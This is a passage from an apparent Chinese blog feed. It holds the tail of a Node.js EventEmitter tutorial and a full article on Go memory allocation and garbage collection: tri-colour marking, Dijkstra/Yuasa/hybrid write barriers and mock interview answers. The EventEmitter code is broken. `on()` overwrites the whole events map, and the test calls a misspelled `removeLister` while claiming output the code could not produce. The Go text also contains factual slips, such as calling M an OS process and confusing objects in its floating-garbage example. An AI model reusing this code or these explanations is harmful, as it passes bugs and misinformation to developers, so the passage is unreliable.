class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">EventEmitter</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">events</span> = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">on</span>(<span class="params">type, handler</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">events</span>[type]) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">events</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">events</span>[type].<span class="title function_">push</span>(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">emit</span>(<span class="params">type, ...args</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">events</span>[type]) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">events</span>[type].<span class="title function_">forEach</span>(<span class="function">(<span class="params">handler</span>) =&gt;</span> &#123;</span><br><span class="line">            handler.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">removeListener</span>(<span class="params">type, handler</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">events</span>[type]) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">events</span>[type] = <span class="variable language_">this</span>.<span class="property">events</span>[type].<span class="title function_">filter</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item != handler);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="测试自定义EventEmitter"><a href="#测试自定义EventEmitter" class="headerlink" title="测试自定义EventEmitter"></a>测试自定义EventEmitter</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bus = <span class="keyword">new</span> <span class="title class_">EventEmitter</span>();</span><br><span class="line"></span><br><span class="line">bus.<span class="title function_">on</span>(<span class="string">&#x27;event&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Event 1&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">event2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Event 2&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bus.<span class="title function_">on</span>(<span class="string">&#x27;event&#x27;</span>, event2);</span><br><span class="line"></span><br><span class="line">bus.<span class="title function_">emit</span>(<span class="string">&#x27;event&#x27;</span>);</span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// Event 1</span></span><br><span class="line"><span class="comment">// Event 2</span></span><br><span class="line"></span><br><span class="line">bus.<span class="title function_">removeLister</span>(<span class="string">&#x27;event&#x27;</span>, event2);</span><br><span class="line">bus.<span class="title function_">emit</span>(<span class="string">&#x27;event&#x27;</span>);</span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// Event 1</span></span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><code>EventEmitter</code>是Node.js中非常重要的一个模块, 它实现了事件驱动的基本模式, 让Node.js具备了处理异步操作的能力。</p>]]></content>
      
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NodeJS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang垃圾回收</title>
      <link href="/d19ea524.html"/>
      <url>/d19ea524.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><p>现代高级编程语言管理内存的方式分自动和手动两种; 手动管理内存的典型代表是C&#x2F;C++, 编写代码过程中需要主动申请或者释放内存; 而PHP、Java和Go等语言使用自动的内存管理系统, 由内存分配器和垃圾收集器来代为分配和回收内存, 其中垃圾收集器就是GC</p></div><div class="note info"><p><strong></strong></p><p>从Go v1.12版本开始, Go使用了<code>非分代的、并发的、基于三色标记清除的垃圾回收器</code>; Go是一种静态类型的编译型语言; 因此, Go不需要VM, Go应用程序二进制文件中嵌入了一个小型运行时(Go runtime), 可以处理垃圾收集(GC)、调度和并发之类的语言功能</p></div><span id="more"></span><h2 id="Golang内存管理"><a href="#Golang内存管理" class="headerlink" title="Golang内存管理"></a>Golang内存管理</h2><p>Golang运行调度三个基本概念: G、M、P;</p><ul><li>G: Goroutine执行的上下文环境;</li><li>M: 操作系统进程;</li><li>P: Processer; 调度器的关键, 调度器, 也可以认为约等于CPU;</li></ul><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/202404162245658.png' data-fancybox='default' data-caption='Go内存管理'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/202404162245658.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202404162245658.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Go内存管理"></a><span class='image-caption'>Go内存管理</span></div></div><h3 id="TCMalloc"><a href="#TCMalloc" class="headerlink" title="TCMalloc"></a>TCMalloc</h3><p>Go将内存划分和分组为页(Page), 这和Java的内存结构完全不同, 没有分代内存, 这样的原因是Go的内存分配器采用了TCMalloc的设计思想:</p><h4 id="Page"><a href="#Page" class="headerlink" title="Page"></a>Page</h4><p>与TCMalloc中的Page相同, x64下1个Page的大小是8KB; 上图的最下方, 1个浅蓝色长方形代表1个Page;</p><h4 id="Span"><a href="#Span" class="headerlink" title="Span"></a>Span</h4><p>与TCMalloc中的Span相同, Span是内存管理的基本单位; 代码中为mspan, 一组连续的Page组成1个Span, 所以上图一组连续的浅蓝色长方形代表的是一组Page组成的1个Span, 另外1个淡紫色长方形为1个Span;</p><h4 id="mcache"><a href="#mcache" class="headerlink" title="mcache"></a>mcache</h4><p>mcache是提供给P(逻辑处理器)的高速缓存, 用于存储小对象(对象大小&lt;&#x3D;32Kb); 尽管这类似于线程堆栈, 但它是堆的一部分, 用于动态数据; 所有类大小的mcache包含scan和noscan类型的mspan。Goroutine可以从mcache没有任何锁的情况下获取内存, 因为一次P只能有一个锁G。因此, 这更有效。mcache从mcentral需要时请求新的span;</p><h4 id="mcentral"><a href="#mcentral" class="headerlink" title="mcentral"></a>mcentral</h4><p>mcentral与TCMalloc中的CentralCache类似, 是所有线程共享的缓存, 需要加锁访问, 它按Span class对Span分类, 串联成链表, 当mcache的某个级别的内存被分配光时, 它会像mcentral申请1个当前级别的Span。每个mcentral包含两个mspanList: </p><ul><li>empty: 双向span链表, 包括没有空闲对象的span或缓存mcache中的span。当此处的span被释放时, 它将被移至non-empty span链表;</li><li>non-empty: 有空闲对象的span双向链表。当从mcentral请求新的span, mcentral将从该链表中获取span并将其移入empty span链表;</li></ul><h4 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h4><p>mheap与TCMalloc中的PageHeap类似, 它是堆内存的抽象, 也是垃圾回收的重点区域, 把从OS申请出的内存页组织成Span, 并保存起来。当mcentral的Span不够用时会向mheap申请, mheap的Span不够用时会向OS申请, 向OS的内存申请是按页来的, 然后把申请来的内存页生成Span组织起来, 同样也是需要加锁访问的;</p><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>这是栈存储区, 每个Goroutine(G)有一个栈。在这里存储了静态数据, 包括函数栈帧, 静态结构, 原生类型值和指向动态结构的指针。这与分配给每个P的mcache不是一回事;</p><h3 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h3><p>Go中的内存分类并不像TCMalloc分成小、中、大对象, 但是它的小对象里又细分了一个Tiny对象, Tiny对象指大小在1Byte到16Byte之间并且不包含指针的对象。小对象和大对象只用大小划定, 无其他区分;</p><blockquote><p>核心思想: 把内存分为多级管理, 降低锁的粒度(只是去mcentral和mheap会申请锁), 以及多种对象大小类型, 减少分配产生的内存碎片;</p></blockquote><h4 id="微小对象-Tiny-（size-16B）"><a href="#微小对象-Tiny-（size-16B）" class="headerlink" title="微小对象(Tiny)（size &lt; 16B）"></a>微小对象(Tiny)（size &lt; 16B）</h4><p>使用mcache的微小分配器分配小于16个字节的对象, 并且在单个16字节块上可完成多个微小分配;</p><h4 id="小对象（size-16B-32KB）"><a href="#小对象（size-16B-32KB）" class="headerlink" title="小对象（size 16B ~ 32KB）"></a>小对象（size 16B ~ 32KB）</h4><p>大小在16个字节和32k字节之间的对象被分配在G运行所在的P的mcache对应的mspan size class上;</p><h4 id="大对象（size-32KB）"><a href="#大对象（size-32KB）" class="headerlink" title="大对象（size &gt; 32KB）"></a>大对象（size &gt; 32KB）</h4><p>大于32 KB的对象直接分配在mheap的相应大小类上(span class);</p><ul><li>如果mheap为空或没有足够大的页面满足分配请求, 则它将从操作系统中分配一组新的页(至少1MB);</li><li>如果对应的大下规格在mcache中没有可用的块, 则向mcentral申请;</li><li>如果mcentral中没有可用的块, 则向mheap中申请, 并根据BestFit算法找到最合适的mspan。如果申请到的mspan超出申请大小, 将会根据需求进行切分, 以返回用户所需的页数。剩余的页构成一个新的mspan放回mheap的空闲列表;</li><li>如果mheap中没有可用的span, 则向操作系统申请一系列新的页(最小1MB)。Go会在操作系统分配超大的页(称作arena)。分配一大批页会减少和操作系统通信的成本;</li></ul><h3 id="内存回收"><a href="#内存回收" class="headerlink" title="内存回收"></a>内存回收</h3><p>go内存会分成堆区(Heap)和栈区(Stack)两个部分, 程序在运行期间可用主动从堆区申请内存空间, 这些内存由内存分配器分配并由垃圾收集器回收。栈区内存由编译器自动进行分配和释放, 栈区中存储的参数以及局部变量, 它们会随着函数的创建而创建, 函数的返回而销毁。如果只申请和分配内存, 内存终将枯竭, Go使用垃圾回收收集不再使用的span, 把span释放交给mheap, mheap对span进行span的合并, 把合并后的span加入到scav树中, 等待再分配内存时, 由mheap进行内存再分配。<strong>因此, Go堆是Go垃圾收集器管理主要区域</strong>;</p><h2 id="标记清除算法"><a href="#标记清除算法" class="headerlink" title="标记清除算法"></a>标记清除算法</h2><p>当成功区分出Go垃圾收集器管理区域的存活对象和死亡对象后, Go垃圾收集器接下来的任务就是执行GC, 释放无用对象占用的内存空间, 以便有足够的可用内存空间为新对象分配内存。</p><p>当堆空间被耗尽时, 就会STW(<code>stop the world</code>), 其执行过程可以分成标记和清除两个阶段。Go垃圾收集器从根节点开始遍历, 执行可达性分析算法, 递归标记所有被引用的对象为存活状态; 标记阶段结束后, 垃圾收集器会依次遍历堆中的对象并清除其中的未被标记为存活的对象;</p><p>由于用户程序在垃圾收集的过程中也不能执行(STW)。在可达性分析算法, Go的GC Roots一般为全局变量和G Stack中的引用指针, 和整堆的对象相比只是极少数, 因此它带来的停顿是非常短暂且相对固定的, 不随堆容量增长。在从GC Roots往下遍历对象的过程, 堆越大, 存储对象越多, 递归遍历越复杂, 要标记更多对象而产生的停顿时间自然就更长。因此我们需要用到更复杂的机制来解决STW的问题;</p><h2 id="三色可达性分析"><a href="#三色可达性分析" class="headerlink" title="三色可达性分析"></a>三色可达性分析</h2><p>为了解决标记清除算法带来的STW问题, Go和Java都会实现三色可达性分析标记算法的变种以缩短STW的时间。三色可达性分析标记算法按”是否被访问过”将程序中的对象分成白色、黑色和灰色:</p><ul><li>白色对象 - 对象尚未被垃圾收集器访问过, 在可达性分析刚开始的阶段, 所有的对象都是白色的, 若在分析结束阶段, 仍然是白色的对象, 即代表不可达;</li><li>黑色对象 - 表示对象已经被垃圾收集器访问过, 且这个对象的所有引用都已经被扫描过, 黑色的对象代表已经被扫描过而且是安全存活的, 如果有其他对象指向黑色对象无需再扫描一遍, 黑色对象不可能直接(不经过灰色对象)指向某个白色对象;</li><li>灰色对象 - 表示对象已经被垃圾收集器访问过, 但是这个对象上至少存在一个引用还没有被扫描过, 因此存在指向白色对象的外部指针, 垃圾收集器会扫描这些对象的子对象;</li></ul><p>三色可达性分析算法大致流程是(初始状态所有对象都是白色):</p><ol><li>从GC Roots开始枚举, 它们所有的直接引用变成灰色(移入灰色集合), GC Roots变为黑色;</li><li>从灰色集合中取出一个灰色对象进行分析:<ul><li>将这个对象所有的直接引用变为灰色, 放入灰色集合中;</li><li>将这个对象变为黑色;</li></ul></li><li>重复步骤2, 一直重复直到灰色集合为空;</li><li>分析完成, 仍然是白色的对象就是GC Roots不可达的对象, 可以作为垃圾被清理;</li></ol><p>具体例子如下图所示, 经过三色可达性分析, 最后白色H为不可达的对象, 是需要垃圾回收的对象;</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/202404242255888.png' data-fancybox='default' data-caption='三色可达性分析'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/202404242255888.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202404242255888.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="三色可达性分析"></a><span class='image-caption'>三色可达性分析</span></div></div><p>三色标记清除算法本身是不可以并发或者增量执行的, 它需要STW, 而如果并发执行, 用户程序可能在标记执行的过程中修改对象的指针;</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/202404252218650.png' data-fancybox='default' data-caption='三色标记清除算法(增量执行)'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/202404252218650.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202404252218650.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="三色标记清除算法(增量执行)"></a><span class='image-caption'>三色标记清除算法(增量执行)</span></div></div><p>这种情况一般会有2种:</p><ol><li>一种是把原来应该垃圾回收的死亡对象错误的标记为存活。虽然这不好，但是不会导致严重后果, 只不过产生了一点逃过本次回收的浮动垃圾而已, 下次清理即可, 比如上图所示的三色标记过程种, 用户取消了从B对象到E对象的引用, 但是因为B到E已经被标记完成不会继续执行步骤2, 所以E对象最终会被错误的标记成黑色, 不会被回收, 这个D就是浮动垃圾, 会在下次垃圾收集中清理;</li><li>一种是把原本存活的对象错误的标记为死亡, 导致”对象消失”, 这在内存管理种是非常严重的错误。比如上图所示的三色标记过程种, 用户程序建立了从B对象到H对象的引用(例如<strong>B.next&#x3D;H</strong>), 接着执行<strong>D.next&#x3D;nil</strong>, 但是因为B到H中不存在灰色对象, 因为在这之间不会继续执行三色并发标记中的步骤2, D到H之间的链接被断开, 所以H对象最终会被标记成白色, 会被垃圾收集器错误的回收。我们将这种错误称为<strong>悬挂指针</strong>, 即指针没有指向特定类型的合法对象, 影响了内存的安全性;</li></ol><h2 id="屏障技术"><a href="#屏障技术" class="headerlink" title="屏障技术"></a>屏障技术</h2><p>为了解决上述的”对象消失”的现象, <code>Wilson</code>于1994年在理论上证明了, 当且仅当以下两个条件同时满足时, 会产生”对象消失”的问题, 即原本应该是黑色的对象被误标为白色:</p><ul><li>赋值器插入了一条或多条从黑色对象到白色对象的新引用;</li><li>赋值器删除了全部从灰色对象到该白色对象的直接或间接引用;</li></ul><p>因此为了要解决并发扫描时的对象消失问题, 保证垃圾收集算法的正确性, 只需破坏这两个条件的任意一个即可, <strong>屏障技术</strong>就是在并发或增量标记过程中保证三色不变性的重要技术;</p><p>内存屏障技术是一种屏障指令, 它可以让CPU或者编译器在执行内存相关操作时遵循特定的约束, 目前多数的现代处理器都会乱序执行指令以最大化性能, 但是该技术能够保证内存操作的顺序性, 在内存屏障前执行的操作一定会先于内存屏障后执行的操作。垃圾收集中的屏障技术更像是一个钩子方法, 它是在用户程序读取对象、创建新对象以及更新对象指针时执行的一段代码, 根据操作类型不同, 我们可以将它们分成读屏障(Read barrier)和写屏障(Write barrier)两种, 因此读屏障需要在读操作中加入代码片段, 对用户程序的性能影响很大, 所以编程语言往往都会采用写屏障保证三色不变性;</p><h3 id="插入写屏障"><a href="#插入写屏障" class="headerlink" title="插入写屏障"></a>插入写屏障</h3><p><code>Dijksrea</code>在1978年提出了插入写屏障, 也被叫做增量更新, 通过如下所示的写屏障, 破坏上述第一个条件(赋值器插入了一条或多条从黑色对象到白色对象的新引用):</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DijkstraWritePointer</span><span class="params">(slot *unsafe.Pointer, ptr unsafe.Pointer)</span></span> &#123;</span><br><span class="line">    shade(ptr)          <span class="comment">//先将新下游对象 ptr 标记为灰色     </span></span><br><span class="line">    *slot = ptr</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//说明：添加下游对象(当前下游对象slot, 新下游对象ptr) &#123;  </span></span><br><span class="line">    <span class="comment">//step 1 标记灰色(新下游对象ptr)   </span></span><br><span class="line">    <span class="comment">//step 2 当前下游对象slot = 新下游对象ptr &#125;</span></span><br><span class="line"><span class="comment">//场景：A.添加下游对象(nil, B) //A 之前没有下游， 新添加一个下游对象B， B被标记为灰色A.添加下游对象(C, B) //A 将下游对象C 更换为B， B被标记为灰色</span></span><br></pre></td></tr></table></figure><p>上述伪代码非常好理解, 当黑色对象(slot)插入新的指向白色对象(ptr)的引用关系时, 就尝试使用shade函数将这个新插入的引用(ptr)标记为灰色;</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/202404271406612.png' data-fancybox='default' data-caption='插入写屏障'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/202404271406612.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202404271406612.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="插入写屏障"></a><span class='image-caption'>插入写屏障</span></div></div><p>假设我们上图的例子并发可达性分析中使用了插入写屏障:</p><ol><li>GC将根对象Root2指向的B对象标记成黑色并将B对象指向的对象D标记成灰色;</li><li>用户程序修改指针, <strong>B.next&#x3D;H</strong>这时触发写屏障将H对象标记成灰色;</li><li>用户程序修改<strong>D.next&#x3D;nil</strong>;</li><li>GC依次遍历程序中的H和D将它们分别标记成黑色;</li></ol><p>由于栈上的对象在垃圾回收中被认为是根对象, 并没有写屏障, 那么导致黑色的栈对象可能指向白色的堆对象, 例如上图1中Root2指向H, 且删除了由D指向H的引用, 由于没有写屏障, 那么H将会被删除。为了保障内存安全, Dijkstra必须为栈上的对象增加写屏障或者在标记阶段完成重新对栈上的对象进行扫描, 这两种方法各有各的缺点, 前者会大幅度增加写入指针的额外开销, 后者重新扫描栈对象时需要暂停对象, 垃圾收集算法的设计者需要在这两者之间做出权衡;</p><h3 id="删除写屏障"><a href="#删除写屏障" class="headerlink" title="删除写屏障"></a>删除写屏障</h3><p><code>Yuasa</code>在1990年提出了删除写屏障, 因为一旦该写屏障开始工作, 它会保证开启写屏障时堆上所有对象的可达, 起始时STW扫描所有的goroutine栈, 保证所有堆上在用的对象都处于灰色保护下, 所以也被称为快照垃圾收集(Snapshot GC), 这是破坏了”对象消失”的第二个条件(赋值器在删除了全部从灰色对象到该白色对象的直接或间接引用);</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 黑色赋值器 Yuasa 屏障</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">YuasaWritePointer</span><span class="params">(slot *unsafe.Pointer, ptr unsafe.Pointer)</span></span> &#123;    </span><br><span class="line">    shade(*slot) <span class="comment">// 先将*slot标记为灰色    </span></span><br><span class="line">    *slot = ptr</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//说明：添加下游对象(当前下游对象slot， 新下游对象ptr) &#123;  //step 1  if (当前下游对象slot是灰色 || 当前下游对象slot是白色) &#123;</span></span><br><span class="line">    标记灰色(当前下游对象slot)     </span><br><span class="line">    <span class="comment">//slot为被删除对象， 标记为灰色  &#125;    </span></span><br><span class="line">    <span class="comment">//step 2  当前下游对象slot = 新下游对象ptr&#125;</span></span><br><span class="line"><span class="comment">//场景A.添加下游对象(B, nil)   //A对象，删除B对象的引用。B被A删除，被标记为灰(如果B之前为白)A.添加下游对象(B, C)     //A对象，更换下游B变成C。B被A删除，被标记为灰(如果B之前为白)</span></span><br></pre></td></tr></table></figure><p>上述代码会在老对象的引用被删除时, 将白色的老对象涂成灰色, 这样删除写屏障就可以保证三色不变性, 老对象引用的下游对象一定可以被灰色对象引用;</p><p>但是这样也会导致一个问题, 由于会将<strong>有存活可能的对象都标记成灰色</strong>, 因此最后可能会导致应该回收的对象未被回收, 这个对象只有在下一个循环才会被回收, 比如下图的D对象</p><blockquote><p>此处有图片</p></blockquote><p>由于原始快照的原因, 起始也是执行STW, 删除写屏障不适用于栈特别大的场景, 栈越大, STW扫描时间越长;</p><h3 id="混合写屏障"><a href="#混合写屏障" class="headerlink" title="混合写屏障"></a>混合写屏障</h3><p>在Go语言v1.7版本之前, 运行时会使用Dijkstra插入写屏障保证三色不变性, 但是运行时并没有在所有垃圾收集根对象上开启插入写屏障。因为应用程序可能包含成百上千的Goroutine, 而垃圾收集的根对象一般包括全局变量和栈对象, 如果运行时需要在几百个Goroutine的栈上都开启写屏障, 会带来巨大的额外开销, 所以Go团队在v1.8结合上述2种写屏障构成了混合写屏障, 实现上选择了在标记阶段完成时暂停程序、将所有栈对象标记成灰色并重新扫描;</p><p>Go语言在v1.8组合Dijkstra插入写屏障和Yuasa删除写屏障构成了如下所示的混合写屏障, 该写屏障会将覆盖的对象标记成灰色并在当前栈没有扫描时将新对象也标记成灰色;</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">writePointer</span><span class="params">(slot, ptr)</span></span> &#123;</span><br><span class="line">    shade(*slot)    </span><br><span class="line">    <span class="keyword">if</span> current stack is grey &#123;</span><br><span class="line">        shade(ptr)  </span><br><span class="line">    &#125;</span><br><span class="line">    *slot = ptr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了移除栈的重新扫描过程, 除了引入混合写屏障之外, 在垃圾收集的标记阶段, 我们还需要将创建的所有新对象都标记成黑色, 防止新分配的栈内存和堆内存中的对象被错误地回收, 以为栈内存在标记阶段最终都会变为黑色, 所以不再需要重新扫描栈空间。总结来说主要有这几点:</p><ol><li>GC开始将栈上地对象全部扫描并标记为黑色;</li><li>GC期间, 任何在栈上创建地新对象, 均为黑色;</li><li>被删除的堆对象标记成灰色;</li><li>被添加的堆对象标记成灰色;</li></ol><h2 id="模拟面试"><a href="#模拟面试" class="headerlink" title="模拟面试"></a>模拟面试</h2><h3 id="STW（Stop-The-World）"><a href="#STW（Stop-The-World）" class="headerlink" title="STW（Stop-The-World）"></a>STW（Stop-The-World）</h3><ul><li><strong>STW问题</strong>: 在垃圾回收期间, 所有的程序操作都被暂停, 直到垃圾回收过程完成。这对高并发应用特别有害, 因为它会导致显著的响应时间和系统吞吐量下降。</li></ul><h4 id="STW的具体影响有哪些？例如在响应时间和吞吐量方面"><a href="#STW的具体影响有哪些？例如在响应时间和吞吐量方面" class="headerlink" title="STW的具体影响有哪些？例如在响应时间和吞吐量方面"></a>STW的具体影响有哪些？例如在响应时间和吞吐量方面</h4><ul><li><strong>响应时间</strong>: STW会导致所有Goroutine暂停, 用户请求无法得到及时响应, 导致应用程序的响应时间增加。</li><li><strong>吞吐量</strong>: 在STW期间, 整个系统的处理能力会下降, 因为没有任何工作在进行。这会降低系统的吞吐量, 使得单位时间内处理的请求数量减少。</li></ul><h3 id="屏障技术-1"><a href="#屏障技术-1" class="headerlink" title="屏障技术"></a>屏障技术</h3><ul><li><strong>屏障技术</strong>: 通过在程序的某些操作上设置”屏障”, 来减少STW的时间。屏障主要有三种类型: 写屏障, 读屏障和删除屏障。</li></ul><h4 id="具体屏障类型"><a href="#具体屏障类型" class="headerlink" title="具体屏障类型"></a>具体屏障类型</h4><ol><li>写屏障: 写屏障在对象引用被写入时触发, 通过记录这些修改, 确保垃圾回收器能够跟踪到所有引用的变化。<ul><li><strong>插入写屏障</strong>: 在对象引用被插入时触发。当一个新引用被写入某个对象字段时, 写屏障会记录这个操作。它确保在GC过程中, 这个新的引用被正确地标记和处理;</li><li><strong>删除写屏障</strong>: 在对象引用被删除时触发, 当一个引用从某个对象字段中被删除时, 写屏障会记录下这个操作, 确保GC能够正确处理引用的删除;</li><li><strong>混合写屏障</strong>: 结合了插入和删除写屏障的特性, 确保在对象引用被修改时正确记录, 结合插入和删除写屏障的功能, 确保任何引用的变化都能被追踪到。</li></ul></li></ol><p><strong>具体实现</strong>: </p><ol><li><strong>插入写屏障</strong>: 在对象赋值操作前, 插入写屏障逻辑, 记录新引用的对象;</li><li><strong>删除写屏障</strong>: 在对象字段被清空或重新赋值前, 记录旧引用的对象;</li><li><strong>混合写屏障</strong>: 综合上述两种操作, 确保所有引用变化都被记录;</li></ol><h3 id="三色标记清除算法的每一步是什么-以及每一种颜色在个步中的作用？"><a href="#三色标记清除算法的每一步是什么-以及每一种颜色在个步中的作用？" class="headerlink" title="三色标记清除算法的每一步是什么, 以及每一种颜色在个步中的作用？"></a>三色标记清除算法的每一步是什么, 以及每一种颜色在个步中的作用？</h3><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤:"></a>步骤:</h4><ol><li><strong>初始化</strong>: 所有对象开始都是白色;</li><li><strong>标记根对象</strong>: 从根对象（Roots）开始扫描, 将根对象标记为灰色, 并将其放入待处理队列;</li><li><strong>处理灰色对象</strong>: <ul><li>取出一个灰色对象, 将它标记为黑色;</li><li>扫描该对象引用的所有子对象, 将未标记的子对象标记为灰色, 并放入待处理队列;</li></ul></li><li><strong>重复</strong>: 重复上一步, 直到待处理队列为空;</li><li><strong>清除白色对象</strong>: 所有未被标记为黑色对象（即白色对象）被认为是垃圾并清除;</li></ol><h4 id="颜色含义"><a href="#颜色含义" class="headerlink" title="颜色含义:"></a>颜色含义:</h4><ul><li><strong>黑色</strong>: 已访问并处理完毕的对象, 不再需要扫描;</li><li><strong>灰色</strong>: 已访问但其引用的对象还未全部处理的对象, 需要进一步扫描;</li><li><strong>白色</strong>: 未访问的对象, 被认为是垃圾;</li></ul><h3 id="Slice"><a href="#Slice" class="headerlink" title="Slice"></a>Slice</h3><blockquote><p>在Go语言中, Slice是一个动态数组的封装, 它由三个部分组成: 指向底层数组的指针、长度（len）和容量（cap）。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> slice <span class="keyword">struct</span> &#123;</span><br><span class="line">    ptr *ElementType <span class="comment">// 指向底层数组的指针</span></span><br><span class="line">    <span class="built_in">len</span> <span class="type">int</span>          <span class="comment">// 当前slice中元素的个数</span></span><br><span class="line">    <span class="built_in">cap</span> <span class="type">int</span>          <span class="comment">// slice的容量, 即底层数组中的元素个数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="slice扩容策略"><a href="#slice扩容策略" class="headerlink" 